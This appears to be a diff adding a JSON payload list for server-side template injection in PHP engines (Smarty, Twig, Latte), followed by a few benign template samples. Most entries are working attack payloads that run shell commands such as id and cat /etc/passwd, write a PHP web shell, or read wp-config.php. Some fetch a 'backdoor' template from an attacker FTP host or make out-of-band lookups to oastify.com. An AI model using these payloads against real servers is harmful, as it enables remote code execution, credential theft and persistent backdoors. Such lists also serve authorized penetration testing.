@@ -1,0 +1,191 @@
+{
+    "category": "Smarty",
+    "keyword": "php",
+    "payloads": [
+      {
+        "type": "Version Check",
+        "tech": "smarty",
+        "payload": "{$smarty.version}"
+      },
+      {
+        "type": "Command Execution (Deprecated)",
+        "tech": "smarty",
+        "payload": "{php}echo `id`;{/php}"
+      },
+      {
+        "type": "File Write",
+        "tech": "smarty",
+        "payload": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "smarty",
+        "payload": "{system('ls')}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "smarty",
+        "payload": "{system('cat index.php')}"
+      },
+
+      {
+        "type": "Basic Injection",
+        "tech": "twig",
+        "payload": "{{7*7}}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "twig",
+        "payload": "{{7*'7'}}"
+      },
+      {
+        "type": "Debugging",
+        "tech": "twig",
+        "payload": "{{dump(app)}}"
+      },
+      {
+        "type": "Debugging",
+        "tech": "twig",
+        "payload": "{{dump(_context)}}"
+      },
+      {
+        "type": "Server Information",
+        "tech": "twig",
+        "payload": "{{app.request.server.all|join(',')}}"
+      },
+      {
+        "type": "Template Format",
+        "tech": "twig",
+        "payload": "$output = $twig > render (\n  'Dear' . $_GET['custom_greeting'],\n  array(\"first_name\" => $user.first_name)\n);"
+      },
+      {
+        "type": "Template Format",
+        "tech": "twig",
+        "payload": "$output = $twig > render (\n  \"Dear {first_name}\",\n  array(\"first_name\" => $user.first_name)\n);"
+      },
+      {
+        "type": "File Reading",
+        "tech": "twig",
+        "payload": "\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@"
+      },
+      {
+        "type": "File Reading",
+        "tech": "twig",
+        "payload": "{{include(\"wp-config.php\")}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{self}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{['id']|filter('system')}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{[0]|reduce('system','id')}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{['id']|map('system')|join}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{['id',1]|sort('system')|join}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{['cat\\x20/etc/passwd']|filter('system')}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{['cat$IFS/etc/passwd']|filter('system')}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{['id']|filter('passthru')}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{['id']|map('passthru')}}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "twig",
+        "payload": "{{['nslookup oastify.com']|filter('system')}}"
+      },
+      {
+        "type": "Context Injection",
+        "tech": "twig",
+        "payload": "FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}"
+      },
+      {
+        "type": "Email Injection",
+        "tech": "twig",
+        "payload": "POST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld"
+      },
+
+      {
+        "type": "Basic Injection",
+        "tech": "latte",
+        "payload": "{var $X=\"POC\"}{$X}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "latte",
+        "payload": "{php system('nslookup oastify.com')}"
+      },
+
+      {
+        "type": "Template Example",
+        "tech": "pattemplate",
+        "payload": "<patTemplate:tmpl name=\"page\">\n  This is the main page.\n  <patTemplate:tmpl name=\"foo\">\n    It contains another template.\n  </patTemplate:tmpl>\n  <patTemplate:tmpl name=\"hello\">\n    Hello {NAME}.<br/>\n  </patTemplate:tmpl>\n</patTemplate:tmpl>"
+      },
+
+      {
+        "type": "Template File",
+        "tech": "phplib",
+        "payload": "<html>\n <head><title>{PAGE_TITLE}</title></head>\n <body>\n  <table>\n   <caption>Authors</caption>\n   <thead>\n    <tr><th>Name</th><th>Email</th></tr>\n   </thead>\n   <tfoot>\n    <tr><td colspan=\"2\">{NUM_AUTHORS}</td></tr>\n   </tfoot>\n   <tbody>\n<!-- BEGIN authorline -->\n    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>\n<!-- END authorline -->\n   </tbody>\n  </table>\n </body>\n</html>"
+      },
+      {
+        "type": "Implementation Code",
+        "tech": "phplib",
+        "payload": "<?php\n//we want to display this author list\n$authors = array(\n    'Christian Weiske'  => 'cweiske@php.net',\n    'Bjoern Schotte'     => 'schotte@mayflower.de'\n);\n\nrequire_once 'HTML/Template/PHPLIB.php';\n//create template object\n$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');\n//load file\n$t->setFile('authors', 'authors.tpl');\n//set block\n$t->setBlock('authors', 'authorline', 'authorline_ref');\n\n//set some variables\n$t->setVar('NUM_AUTHORS', count($authors));\n$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));\n\n//display the authors\nforeach ($authors as $name => $email) {\n    $t->setVar('AUTHOR_NAME', $name);\n    $t->setVar('AUTHOR_EMAIL', $email);\n    $t->parse('authorline_ref', 'authorline', true);\n}\n\n//finish and echo\necho $t->finish($t->parse('OUT', 'authors'));\n?>"
+      },
+
+      {
+        "type": "Controller Example",
+        "tech": "plates",
+        "payload": "<?php\n// Create new Plates instance\n$templates = new League\\Plates\\Engine('/path/to/templates');\n\n// Render a template\necho $templates->render('profile', ['name' => 'Jonathan']);"
+      },
+      {
+        "type": "Page Template",
+        "tech": "plates",
+        "payload": "<?php $this->layout('template', ['title' => 'User Profile']) ?>\n\n<h1>User Profile</h1>\n<p>Hello, <?=$this->e($name)?></p>"
+      },
+      {
+        "type": "Layout Template",
+        "tech": "plates",
+        "payload": "<html>\n  <head>\n    <title><?=$this->e($title)?></title>\n  </head>\n  <body>\n    <?=$this->section('content')?>\n  </body>\n</html>"
+      }
+    ]
+}
